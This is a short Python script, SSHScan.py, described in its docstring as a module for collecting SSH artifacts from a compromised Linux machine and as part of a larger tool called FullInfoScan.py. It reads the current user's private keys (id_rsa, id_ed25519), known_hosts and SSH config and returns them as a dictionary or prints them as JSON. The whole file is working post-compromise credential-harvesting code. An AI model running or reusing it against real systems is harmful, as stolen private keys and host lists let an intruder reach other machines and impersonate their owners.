#!/usr/bin/env python3
"""
SSHScan.py
Author: William Walker
Purpose: Collect SSH related artifacts from a compromised Linux box 

This module collects: ~/.ssh/id_rsa , ~/.ssh/id_ed25519 , ~/.ssh/known_hosts ,  ~/.ssh/config

Can be run byu itself or imported by FullInfoScan.py
"""

import os
import json

try:
    from .utils import read_file, get_user_home
except ImportError:
    from utils import read_file, get_user_home



"""Return the path to ~/.ssh for the current user."""
def get_ssh_directory():
    try:

        home = os.path.expanduser("~")
        return os.path.join(home, ".ssh")
    
    except Exception:
        return None

"""Collect private keys if they exist."""
def collect_ssh_keys():

    ssh_dir = get_ssh_directory()
    if not ssh_dir:
        return None

    return {
        "id_rsa": read_file(os.path.join(ssh_dir, "id_rsa")),
        "id_ed25519": read_file(os.path.join(ssh_dir, "id_ed25519"))
    }

"""Collect SSH config and known_hosts."""
def collect_ssh_config():

    ssh_dir = get_ssh_directory()
    if not ssh_dir:
        return None

    return {
        "config": read_file(os.path.join(ssh_dir, "config")),
        "known_hosts": read_file(os.path.join(ssh_dir, "known_hosts"))
    }


"""
Main function used by FullInfoScan.py
Returns a dict of SSH-related data.
"""
def run():

    data = {
        "private_keys": collect_ssh_keys(),
        "config_files": collect_ssh_config()
    }

    return data


"""
prints results to terminal.
"""
def alone():
    data = run()
    print(json.dumps(data, indent=4))


if __name__ == "__main__":
    alone()